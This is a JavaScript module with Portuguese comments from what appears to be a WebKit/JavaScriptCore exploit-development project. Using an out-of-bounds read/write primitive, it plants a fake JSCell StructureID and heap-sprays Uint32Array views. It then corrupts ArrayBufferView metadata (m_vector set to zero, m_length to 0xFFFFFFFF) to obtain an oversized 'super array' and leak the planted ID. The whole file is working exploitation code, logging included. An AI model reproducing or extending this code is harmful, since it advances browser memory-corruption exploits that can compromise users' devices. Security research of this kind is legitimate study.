// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v10.38"; // Versão incrementada para refletir as mudanças

const CORRUPTION_OFFSET_TRIGGER_0x70 = 0x70; // Não usado diretamente se m_length é escrito em TARGET_MLENGTH_OFFSET_IN_OOB
const CORRUPTION_VALUE_0x70 = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF); // Não usado diretamente

// Área no oob_array_buffer_real onde os metadados de uma view serão corrompidos
const TARGET_METADATA_AREA_IN_OOB = 0x58;
const TARGET_MVECTOR_OFFSET_IN_OOB = TARGET_METADATA_AREA_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x68
const TARGET_MLENGTH_OFFSET_IN_OOB = TARGET_METADATA_AREA_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; // 0x70

const DESIRED_MVECTOR_VALUE  = AdvancedInt64.Zero;
const DESIRED_MLENGTH_VALUE  = 0xFFFFFFFF;

// Offset no oob_array_buffer_real onde plantaremos um JSCell FALSO para ler seu SID
const FAKE_U32_ARRAY_JSCELL_OFFSET_IN_OOB = 0x400;
const FAKE_U32_ARRAY_SID_TO_PLANT = 0xABCDEF01;

let DISCOVERED_UINT32ARRAY_SID = null;


// ============================================================
// FUNÇÃO PRINCIPAL (v10.38 - Depuração da Identificação da Super View)
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.leakPlantedSIDWithSuperArray_v10.38`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Depurar Identificação da SuperView e Vazar SID Plantado ---`, "test", FNAME_CURRENT_TEST);

    const NUM_SPRAY_VIEWS = 200;
    const SPRAY_VIEW_ELEMENT_COUNT = 8; // Elementos Uint32

    let sprayedVictimViews = [];
    let superArray = null;
    let superArrayIndex = -1;

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);

        // 1. Plantar um JSCell FALSO (apenas o SID)
        logS3(`PASSO 1: Plantando SID FALSO ${toHex(FAKE_U32_ARRAY_SID_TO_PLANT)} em ${toHex(FAKE_U32_ARRAY_JSCELL_OFFSET_IN_OOB)}...`, "info", FNAME_CURRENT_TEST);
        oob_write_absolute(FAKE_U32_ARRAY_JSCELL_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET, FAKE_U32_ARRAY_SID_TO_PLANT, 4);
        oob_write_absolute(FAKE_U32_ARRAY_JSCELL_OFFSET_IN_OOB + JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, AdvancedInt64.Zero, 8);

        // 2. Heap Spraying: Criar VIEWS sobre o oob_array_buffer_real
        logS3(`PASSO 2: Pulverizando ${NUM_SPRAY_VIEWS} Uint32Array views (${SPRAY_VIEW_ELEMENT_COUNT} elementos cada) sobre oob_array_buffer_real...`, "info", FNAME_CURRENT_TEST);
        let current_data_offset_for_view = (OOB_CONFIG.BASE_OFFSET_IN_DV || 0) + 0x800; // Começa um pouco depois para evitar sobreposição com metadados e JSCell falso
        for (let i = 0; i < NUM_SPRAY_VIEWS; i++) {
            const view_byte_length = SPRAY_VIEW_ELEMENT_COUNT * 4; // 4 bytes por Uint32
            if (current_data_offset_for_view + view_byte_length > oob_array_buffer_real.byteLength) {
                logS3(`  Atingido limite do oob_array_buffer_real. Pulverizadas ${i} views.`, "warn", FNAME_CURRENT_TEST);
                break;
            }
            try {
                let view = new Uint32Array(oob_array_buffer_real, current_data_offset_for_view, SPRAY_VIEW_ELEMENT_COUNT);
                view[0] = (0xFACE0000 | i); // Marcador único na própria view
                sprayedVictimViews.push(view);
                current_data_offset_for_view += view_byte_length + 0x80; // Adiciona padding entre views
            } catch (e_spray) {
                logS3(`  Erro durante a pulverização na view ${i}: ${e_spray.message}. Parando pulverização.`, "error", FNAME_CURRENT_TEST);
                break;
            }
        }
        logS3(`  ${sprayedVictimViews.length} views pulverizadas.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(300);

        // 3. Corromper metadados em TARGET_METADATA_AREA_IN_OOB (0x58)
        logS3(`PASSO 3: Corrompendo metadados em ${toHex(TARGET_METADATA_AREA_IN_OOB)} para m_vector=${DESIRED_MVECTOR_VALUE.toString(true)}, m_length=${toHex(DESIRED_MLENGTH_VALUE)}...`, "info", FNAME_CURRENT_TEST);
        oob_write_absolute(TARGET_MVECTOR_OFFSET_IN_OOB, DESIRED_MVECTOR_VALUE, 8); // Escreve m_vector (geralmente 0x68)
        oob_write_absolute(TARGET_MLENGTH_OFFSET_IN_OOB, DESIRED_MLENGTH_VALUE, 4); // Escreve m_length (geralmente 0x70)
        await PAUSE_S3(100);

        // VERIFICAÇÃO DA CORRUPÇÃO
        const val_mvec_read = oob_read_absolute(TARGET_MVECTOR_OFFSET_IN_OOB, 8);
        const val_mlen_read = oob_read_absolute(TARGET_MLENGTH_OFFSET_IN_OOB, 4);
        logS3(`  VERIFICAÇÃO PÓS-CORRUPÇÃO:`, "info", FNAME_CURRENT_TEST);
        logS3(`    m_vector lido de ${toHex(TARGET_MVECTOR_OFFSET_IN_OOB)}: ${val_mvec_read.toString(true)} (Esperado: ${DESIRED_MVECTOR_VALUE.toString(true)})`, "info", FNAME_CURRENT_TEST);
        logS3(`    m_length lido de ${toHex(TARGET_MLENGTH_OFFSET_IN_OOB)}: ${toHex(val_mlen_read)} (Esperado: ${toHex(DESIRED_MLENGTH_VALUE)})`, "info", FNAME_CURRENT_TEST);

        const mvec_is_correct = val_mvec_read.low() === DESIRED_MVECTOR_VALUE.low() && val_mvec_read.high() === DESIRED_MVECTOR_VALUE.high();
        const mlen_is_correct = val_mlen_read === DESIRED_MLENGTH_VALUE;

        if (mvec_is_correct && mlen_is_correct) {
            logS3("    CONFIRMADO: Bytes em ${toHex(TARGET_METADATA_AREA_IN_OOB)} (m_vector, m_length) parecem corrompidos como esperado.", "good", FNAME_CURRENT_TEST);
        } else {
            logS3("    AVISO CRÍTICO: Os bytes em ${toHex(TARGET_METADATA_AREA_IN_OOB)} (m_vector, m_length) NÃO foram corrompidos como esperado. Verifique a lógica OOB.", "critical", FNAME_CURRENT_TEST);
            // Decide se quer parar ou continuar mesmo com a verificação falhando
            // throw new Error("Falha na verificação da corrupção dos metadados.");
        }

        // 4. Tentar Identificar o "Super Array" (View)
        logS3(`PASSO 4: Tentando identificar uma "Super View"...`, "info", FNAME_CURRENT_TEST);
        const MARKER_VALUE = 0xBEEFBEEF; // Valor a ser escrito no oob_array_buffer_real
        const MARKER_TEST_OFFSET_IN_OOB = 0xE0; // Offset no oob_array_buffer_real para escrever o marcador
                                              // Este offset deve ser acessível pela Super View se m_vector=0
        const MARKER_TEST_INDEX_IN_SUPERVIEW = MARKER_TEST_OFFSET_IN_OOB / 4; // Índice Uint32 correspondente

        logS3(`  Marcador de teste: Valor=${toHex(MARKER_VALUE)}, Offset no OOB Buffer=${toHex(MARKER_TEST_OFFSET_IN_OOB)}, Índice esperado na SuperView=${toHex(MARKER_TEST_INDEX_IN_SUPERVIEW)}`, "info", FNAME_CURRENT_TEST);

        let original_value_at_marker_offset = 0;
        try {
            original_value_at_marker_offset = oob_read_absolute(MARKER_TEST_OFFSET_IN_OOB, 4); // Salva valor original
            logS3(`  Valor original em ${toHex(MARKER_TEST_OFFSET_IN_OOB)}: ${toHex(original_value_at_marker_offset)}`, "info", FNAME_CURRENT_TEST);
        } catch(e){
            logS3(`  Aviso: Não foi possível ler o valor original em ${toHex(MARKER_TEST_OFFSET_IN_OOB)}: ${e.message}`, "warn", FNAME_CURRENT_TEST);
        }
        oob_write_absolute(MARKER_TEST_OFFSET_IN_OOB, MARKER_VALUE, 4); // Escreve o marcador
        logS3(`  Marcador ${toHex(MARKER_VALUE)} escrito em ${toHex(MARKER_TEST_OFFSET_IN_OOB)} via oob_write_absolute.`, "info", FNAME_CURRENT_TEST);

        for (let i = 0; i < sprayedVictimViews.length; i++) {
            const current_view = sprayedVictimViews[i];
            logS3(`  Testando view candidata [${i}] (marcador inicial: ${toHex(current_view[0])})...`, "info", FNAME_CURRENT_TEST);
            logS3(`    View[${i}] props: length=${current_view.length}, byteLength=${current_view.byteLength}, byteOffset=${current_view.byteOffset}, buffer.byteLength=${current_view.buffer.byteLength}`, "info", FNAME_CURRENT_TEST);

            try {
                // Acesso crítico que pode falhar ou revelar a Super View
                const value_read_from_view = current_view[MARKER_TEST_INDEX_IN_SUPERVIEW];
                logS3(`    View[${i}] no índice ${MARKER_TEST_INDEX_IN_SUPERVIEW} (${toHex(MARKER_TEST_INDEX_IN_SUPERVIEW * 4)}) leu: ${toHex(value_read_from_view)}`, "info", FNAME_CURRENT_TEST);

                if (value_read_from_view === MARKER_VALUE) {
                    logS3(`    !!!! SUPER ARRAY (VIEW) POTENCIALMENTE ENCONTRADO !!!! sprayedVictimViews[${i}] (marcador dados: ${toHex(current_view[0])})`, "vuln", FNAME_CURRENT_TEST);
                    logS3(`      Confirmado: View[${i}][${MARKER_TEST_INDEX_IN_SUPERVIEW}] (${toHex(value_read_from_view)}) === MARKER_VALUE (${toHex(MARKER_VALUE)})`, "vuln", FNAME_CURRENT_TEST);
                    superArray = current_view;
                    superArrayIndex = i;
                    document.title = `SUPER VIEW[${i}] ATIVA!`;
                    break;
                }
            } catch (e_access) {
                logS3(`    ERRO ao acessar sprayedVictimViews[${i}][${MARKER_TEST_INDEX_IN_SUPERVIEW}]: ${e_access.name} - ${e_access.message}`, "error", FNAME_CURRENT_TEST);
                // Continuar para a próxima view
            }
        }

        // Restaurar valor original no oob_buffer
        try {
            oob_write_absolute(MARKER_TEST_OFFSET_IN_OOB, original_value_at_marker_offset, 4);
            logS3(`  Valor original ${toHex(original_value_at_marker_offset)} restaurado em ${toHex(MARKER_TEST_OFFSET_IN_OOB)}.`, "info", FNAME_CURRENT_TEST);
        } catch(e){
             logS3(`  Aviso: Não foi possível restaurar o valor original em ${toHex(MARKER_TEST_OFFSET_IN_OOB)}: ${e.message}`, "warn", FNAME_CURRENT_TEST);
        }


        if (superArray) {
            logS3(`    SUPER ARRAY JS: sprayedVictimViews[${superArrayIndex}] (marcador: ${toHex(superArray[0])}) identificado!`, "good", FNAME_CURRENT_TEST);
            logS3(`      superArray.length (JS): ${superArray.length}. Tentando ler SID plantado...`, "info", FNAME_CURRENT_TEST);

            const sid_read_target_addr_in_oob = FAKE_U32_ARRAY_JSCELL_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET;
            logS3(`      Endereço alvo para leitura do SID no oob_buffer: ${toHex(sid_read_target_addr_in_oob)}`, "info", FNAME_CURRENT_TEST);

            if (sid_read_target_addr_in_oob % 4 === 0) {
                const sid_index_in_superarray = sid_read_target_addr_in_oob / 4;
                logS3(`      Índice correspondente no SuperArray: ${sid_index_in_superarray} (0x${sid_index_in_superarray.toString(16)})`, "info", FNAME_CURRENT_TEST);

                if (superArray.length > sid_index_in_superarray && sid_index_in_superarray >= 0) {
                    try {
                        const sid_leaked_via_superarray = superArray[sid_index_in_superarray];
                        logS3(`      LIDO COM SUPERARRAY de oob[${toHex(sid_read_target_addr_in_oob)}]: ${toHex(sid_leaked_via_superarray)}`, "leak", FNAME_CURRENT_TEST);
                        if (sid_leaked_via_superarray === FAKE_U32_ARRAY_SID_TO_PLANT) {
                            logS3(`        !!!! SUCESSO !!!! O SID plantado (${toHex(FAKE_U32_ARRAY_SID_TO_PLANT)}) foi lido corretamente com o SuperArray!`, "vuln", FNAME_CURRENT_TEST);
                            DISCOVERED_UINT32ARRAY_SID = sid_leaked_via_superarray;
                            logS3(`        Considerando ${toHex(DISCOVERED_UINT32ARRAY_SID)} como um StructureID REAL para Uint32Array! (Verifique!)`, "vuln", FNAME_CURRENT_TEST);
                            document.title = `SID ${toHex(DISCOVERED_UINT32ARRAY_SID)} Vazado!`;
                        } else {
                            logS3(`        AVISO: SID lido (${toHex(sid_leaked_via_superarray)}) não corresponde ao plantado (${toHex(FAKE_U32_ARRAY_SID_TO_PLANT)}).`, "warn", FNAME_CURRENT_TEST);
                        }
                    } catch (e_read_sid) {
                        logS3(`        ERRO ao ler SID com SuperArray no índice ${sid_index_in_superarray}: ${e_read_sid.name} - ${e_read_sid.message}`, "error", FNAME_CURRENT_TEST);
                    }
                } else {
                    logS3(`      AVISO: Índice ${sid_index_in_superarray} para leitura do SID está fora dos limites do superArray.length aparente (${superArray.length}) ou é negativo.`, "warn", FNAME_CURRENT_TEST);
                }
            } else {
                logS3(`      AVISO: Endereço de leitura de SID ${toHex(sid_read_target_addr_in_oob)} não alinhado para acesso Uint32.`, "warn", FNAME_CURRENT_TEST);
            }
        } else {
            logS3("    Não foi possível identificar a 'Super View' específica via teste de marcador.", "error", FNAME_CURRENT_TEST); // Mudado para error para maior destaque
            document.title = `${FNAME_MAIN} SuperView FAIL!`;
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO GERAL: ${e.message}`, "critical", FNAME_CURRENT_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU CRITICAMENTE!`;
    } finally {
        sprayedVictimViews = []; // Limpar array de views
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
}
